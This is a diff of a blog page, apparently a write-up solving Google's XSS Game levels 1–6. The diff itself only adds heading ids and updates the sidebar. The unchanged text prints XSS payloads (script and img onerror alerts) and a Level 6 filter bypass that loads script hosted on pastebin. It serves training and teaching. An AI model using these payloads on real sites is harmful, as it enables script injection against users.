@@ -1785,13 +1785,13 @@ jQuery(document).ready(function($) {
 </header>
 
   <div class="entry-content"><p>These are my steps how I've solved the <a href="https://xss-game.appspot.com/">XSS Game</a></p>
-<h2>Level 1</h2>
+<h2 id="level-1">Level 1</h2>
 <p>This is the most obvious and easiest one. Just insert following code and you're done:</p>
 <div class="highlight"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </pre></div>
 
 
-<h2>Level 2</h2>
+<h2 id="level-2">Level 2</h2>
 <p>Since the <code>script</code> won't work you'll have to think of another tags to trigger JavaScript code execution. The first thing which came in mind was to use <code>img</code> tags along with the <code>onerror</code> attributes. Here you go:</p>
 <div class="highlight"><pre><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://inexist.ent&quot;</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">&quot;javascript:alert(1)&quot;</span><span class="o">/&gt;</span>
 </pre></div>
@@ -1799,7 +1799,7 @@ jQuery(document).ready(function($) {
 
 <!--more-->
 
-<h2>Level 3</h2>
+<h2 id="level-3">Level 3</h2>
 <p>Well this time I had to read some code in order to understand the applications logic. If you toggle the code you'll see <code>index.html</code>:</p>
 <div class="highlight"><pre><span class="p">[...]</span>
       <span class="kd">function</span> <span class="nx">chooseTab</span><span class="p">(</span><span class="nx">num</span><span class="p">)</span> <span class="p">{</span>
@@ -1816,7 +1816,7 @@ jQuery(document).ready(function($) {
 </pre></div>
 
 
-<h2>Level 4</h2>
+<h2 id="level-4">Level 4</h2>
 <p>This is quite tricky. This time I have followed the provided hints. Having the JS console activated and requesting <code>https://xss-game.appspot.com/level4/frame?timer='</code> showed me following output:</p>
 <div class="highlight"><pre><span class="nx">SyntaxError</span><span class="o">:</span> <span class="nx">unterminated</span> <span class="nx">string</span> <span class="nx">literal</span>
 
@@ -1865,7 +1865,7 @@ jQuery(document).ready(function($) {
 
 
 <p>I must admit: Nice one!</p>
-<h2>Level 5</h2>
+<h2 id="level-5">Level 5</h2>
 <p>This one was quite easy. On the first page you can see a link: <code>https://xss-game.appspot.com/level5/frame/signup?next=confirm</code>. Now let's have a look how this <code>next</code> parameter is used in <code>confirm.html</code>:</p>
 <div class="highlight"><pre><span class="p">[...]</span>
 <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
@@ -1891,7 +1891,7 @@ jQuery(document).ready(function($) {
 <li>Click <code>Next &gt;&gt;</code></li>
 <li>Voila!</li>
 </ul>
-<h2>Level 6</h2>
+<h2 id="level-6">Level 6</h2>
 <p>This time I had to figure to host my JS code. So I've used <code>pastebin.com</code> to host my <a href="http://pastebin.com/raw.php?i=rTRPYeNk">evil code</a>. Next I had a look at the code. As you can read a new <code>script</code> tag is created and the <code>src</code> attribute is set appropriately. The only catch about it: You're not allowed to have a URL containing <em>https?</em>:</p>
 <div class="highlight"><pre><span class="p">[...]</span>
       <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^https?:\/\//</span><span class="p">))</span> <span class="p">{</span>
@@ -1913,7 +1913,7 @@ jQuery(document).ready(function($) {
 <ul>
 <li>https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</li>
 </ul>
-<h2>Conclusion</h2>
+<h2 id="conclusion">Conclusion</h2>
 <p>This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)</p></div>
     <footer>
 <p class="meta">
@@ -1942,6 +1942,9 @@ jQuery(document).ready(function($) {
     <h1>Recent Posts</h1>
     <ul id="recent_posts">
       <li class="post">
+          <a href="http://blog.dornea.nu/2014/11/21/using-blockdiag-with-pelican-and-liquid-tags">Using Blockdiag with Pelican and liquid tags</a>
+      </li>
+      <li class="post">
           <a href="http://blog.dornea.nu/2014/11/13/using-graphviz-with-pelican-and-liquid-tags">Using Graphviz with Pelican and liquid tags</a>
       </li>
       <li class="post">
@@ -1952,9 +1955,6 @@ jQuery(document).ready(function($) {
       </li>
       <li class="post">
           <a href="http://blog.dornea.nu/2014/09/12/howto-androguard-with-docker">HowTo: Androguard with Docker</a>
-      </li>
-      <li class="post">
-          <a href="http://blog.dornea.nu/2014/08/28/using-jquery-datatables-with-ipython">Using JQuery DataTables with IPython</a>
       </li>
     </ul>
   </section>
@@ -1969,7 +1969,7 @@ jQuery(document).ready(function($) {
 
   <section>
   <h1>Tags</h1>
-    <a href="http://blog.dornea.nu/tag/docker/">docker</a>,    <a href="http://blog.dornea.nu/tag/code/">code</a>,    <a href="http://blog.dornea.nu/tag/pelican/">pelican</a>,    <a href="http://blog.dornea.nu/tag/coding/">coding</a>,    <a href="http://blog.dornea.nu/tag/droidbox/">droidbox</a>,    <a href="http://blog.dornea.nu/tag/openssl/">openssl</a>,    <a href="http://blog.dornea.nu/tag/books/">books</a>,    <a href="http://blog.dornea.nu/tag/virtualization/">virtualization</a>,    <a href="http://blog.dornea.nu/tag/web/">web</a>,    <a href="http://blog.dornea.nu/tag/wargames/">wargames</a>,    <a href="http://blog.dornea.nu/tag/networking/">networking</a>,    <a href="http://blog.dornea.nu/tag/network/">network</a>,    <a href="http://blog.dornea.nu/tag/octopress/">octopress</a>,    <a href="http://blog.dornea.nu/tag/blog/">blog</a>,    <a href="http://blog.dornea.nu/tag/re/">re</a>,    <a href="http://blog.dornea.nu/tag/low/">low</a>,    <a href="http://blog.dornea.nu/tag/android/">android</a>,    <a href="http://blog.dornea.nu/tag/androguard/">androguard</a>,    <a href="http://blog.dornea.nu/tag/events/">events</a>,    <a href="http://blog.dornea.nu/tag/uncategorized/">uncategorized</a>,    <a href="http://blog.dornea.nu/tag/cryptography/">cryptography</a>,    <a href="http://blog.dornea.nu/tag/python/">python</a>,    <a href="http://blog.dornea.nu/tag/misc/">misc</a>,    <a href="http://blog.dornea.nu/tag/javascript/">javascript</a>,    <a href="http://blog.dornea.nu/tag/howto/">howto</a>,    <a href="http://blog.dornea.nu/tag/wtf/">wtf</a>,    <a href="http://blog.dornea.nu/tag/ipython/">ipython</a>,    <a href="http://blog.dornea.nu/tag/java/">java</a>,    <a href="http://blog.dornea.nu/tag/graphviz/">graphviz</a>,    <a href="http://blog.dornea.nu/tag/ios/">ios</a>,    <a href="http://blog.dornea.nu/tag/security/">security</a>,    <a href="http://blog.dornea.nu/tag/jquery/">jquery</a>,    <a href="http://blog.dornea.nu/tag/science/">science</a>,    <a href="http://blog.dornea.nu/tag/eclipse/">eclipse</a>,    <a href="http://blog.dornea.nu/tag/crypto/">crypto</a>,    <a href="http://blog.dornea.nu/tag/sca/">sca</a>,    <a href="http://blog.dornea.nu/tag/appsec/">appsec</a>,    <a href="http://blog.dornea.nu/tag/whatsapp/">whatsapp</a>,    <a href="http://blog.dornea.nu/tag/debug/">debug</a>,    <a href="http://blog.dornea.nu/tag/hacking/">hacking</a>  </section>
+    <a href="http://blog.dornea.nu/tag/docker/">docker</a>,    <a href="http://blog.dornea.nu/tag/code/">code</a>,    <a href="http://blog.dornea.nu/tag/pelican/">pelican</a>,    <a href="http://blog.dornea.nu/tag/coding/">coding</a>,    <a href="http://blog.dornea.nu/tag/droidbox/">droidbox</a>,    <a href="http://blog.dornea.nu/tag/graphviz/">graphviz</a>,    <a href="http://blog.dornea.nu/tag/books/">books</a>,    <a href="http://blog.dornea.nu/tag/blockdiag/">blockdiag</a>,    <a href="http://blog.dornea.nu/tag/virtualization/">virtualization</a>,    <a href="http://blog.dornea.nu/tag/viz/">viz</a>,    <a href="http://blog.dornea.nu/tag/web/">web</a>,    <a href="http://blog.dornea.nu/tag/wargames/">wargames</a>,    <a href="http://blog.dornea.nu/tag/networking/">networking</a>,    <a href="http://blog.dornea.nu/tag/network/">network</a>,    <a href="http://blog.dornea.nu/tag/pandoc/">pandoc</a>,    <a href="http://blog.dornea.nu/tag/octopress/">octopress</a>,    <a href="http://blog.dornea.nu/tag/blog/">blog</a>,    <a href="http://blog.dornea.nu/tag/re/">re</a>,    <a href="http://blog.dornea.nu/tag/low/">low</a>,    <a href="http://blog.dornea.nu/tag/android/">android</a>,    <a href="http://blog.dornea.nu/tag/androguard/">androguard</a>,    <a href="http://blog.dornea.nu/tag/events/">events</a>,    <a href="http://blog.dornea.nu/tag/uncategorized/">uncategorized</a>,    <a href="http://blog.dornea.nu/tag/cryptography/">cryptography</a>,    <a href="http://blog.dornea.nu/tag/python/">python</a>,    <a href="http://blog.dornea.nu/tag/misc/">misc</a>,    <a href="http://blog.dornea.nu/tag/javascript/">javascript</a>,    <a href="http://blog.dornea.nu/tag/howto/">howto</a>,    <a href="http://blog.dornea.nu/tag/wtf/">wtf</a>,    <a href="http://blog.dornea.nu/tag/ipython/">ipython</a>,    <a href="http://blog.dornea.nu/tag/java/">java</a>,    <a href="http://blog.dornea.nu/tag/ios/">ios</a>,    <a href="http://blog.dornea.nu/tag/security/">security</a>,    <a href="http://blog.dornea.nu/tag/jquery/">jquery</a>,    <a href="http://blog.dornea.nu/tag/openssl/">openssl</a>,    <a href="http://blog.dornea.nu/tag/science/">science</a>,    <a href="http://blog.dornea.nu/tag/eclipse/">eclipse</a>,    <a href="http://blog.dornea.nu/tag/crypto/">crypto</a>,    <a href="http://blog.dornea.nu/tag/sca/">sca</a>,    <a href="http://blog.dornea.nu/tag/appsec/">appsec</a>,    <a href="http://blog.dornea.nu/tag/whatsapp/">whatsapp</a>,    <a href="http://blog.dornea.nu/tag/debug/">debug</a>,    <a href="http://blog.dornea.nu/tag/hacking/">hacking</a>  </section>
 
 
 
